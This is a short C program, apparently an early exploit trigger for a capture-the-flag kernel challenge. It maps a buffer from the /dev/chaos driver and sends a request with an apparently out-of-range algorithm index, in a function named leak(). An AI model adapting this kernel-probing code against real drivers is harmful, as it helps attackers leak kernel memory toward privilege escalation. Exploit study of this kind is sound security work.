#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <chaos.h>

#define DEBUG

#ifdef DEBUG
#include <stdio.h>
#define debug(fmt, ...) fprintf(stderr, "%s:%d: %s: " fmt, __FILE__, __LINE__, __func__, __VA_ARGS__)
#else
#define debug(...)
#endif

#define CHECK(cond) do { \
  if (!(cond)) { \
    debug("check \"%s\" failed.\n", #cond); \
    _exit(2); \
  } \
} while (0)

#define OPEN() open("/dev/chaos", O_RDWR)
static uint16_t cur_seq = 0;

static void leak() {
  int fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x1000) == 0);
  uint32_t *buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  CHECK(buf != MAP_FAILED);
  struct chaos_request req = {
    .algo = 100,
    .input = 0x0,
    .in_size = 0x4,
  };
  buf[0] = 0xdeadbeefu;
  ioctl(fd, CHAOS_REQUEST, &req);
  debug("%s#%d: err=%s\n", __func__, __LINE__, strerror(errno));
  close(fd);
  munmap(buf, 0x1000);
}

int main() {
  leak();
  return 0;
}
